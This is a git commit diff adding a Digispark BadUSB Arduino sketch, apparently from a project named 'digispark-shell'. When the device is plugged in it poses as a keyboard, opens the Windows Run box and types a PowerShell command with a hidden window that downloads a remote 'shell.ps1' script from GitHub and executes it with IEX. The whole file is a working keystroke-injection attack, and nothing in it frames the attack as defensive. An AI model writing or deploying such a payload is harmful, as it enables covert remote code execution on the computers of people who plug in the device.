63dba0a1b9488baa7f58b35042412128c56a5107
Louie-Cipher <louie.spena@outlook.com>
2022-09-07 15:24:45 -0300

    init

---
+++ script/script.ino
@@ -0,0 +1,29 @@
+#include "DigiKeyboardPtBr.h"
+
+void setup()
+{
+    pinMode(1, OUTPUT);
+    ledBlink(5);
+
+    DigiKeyboardPtBr.delay(300);
+    DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    ledBlink(8);
+
+    DigiKeyboardPtBr.println(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1');\""));
+}
+
+void loop()
+{
+    ledBlink(10);
+}
+
+void ledBlink(int times)
+{
+    for (int i = 0; i < times; i++)
+    {
+        digitalWrite(1, HIGH);
+        DigiKeyboardPtBr.delay(250);
+        digitalWrite(1, LOW);
+        DigiKeyboardPtBr.delay(250);
+    }
+}
